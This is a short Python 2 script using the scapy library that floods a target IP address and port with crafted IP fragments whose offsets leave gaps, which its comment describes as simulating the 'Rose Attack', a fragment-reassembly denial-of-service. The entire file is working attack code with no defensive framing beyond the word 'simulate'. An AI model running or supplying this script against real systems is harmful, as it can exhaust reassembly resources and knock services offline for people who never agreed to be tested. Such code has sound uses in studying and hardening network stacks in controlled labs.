#!usr/bin/env python
import sys
from scapy.all import *





# Sending multiple fragmented packets with escaped offsets (missing fragmented packets) in order to simulate the Rose Attack
def RoseAttack(Ip,Interface,D_Port):

    print "The RoseAttack attack is initiating %s" %Ip
    i=IP()/TCP(dport=D_Port)
    i.dst=Ip
    for j in range(20):

        size=80

        load1="a"*size

        i.flags="MF"

        send(i/load1,verbose=0,iface=Interface)

        offset=807

        for k in range(20):
            i.frag=offset
            offset+=807
            send(i/load1,verbose=0,iface=Interface)

        i.flags=0
        i.frag=16330

        send(i/load1,count=15,verbose=0,iface=Interface)
        i.id+=23
        i.frag=0


    return 007




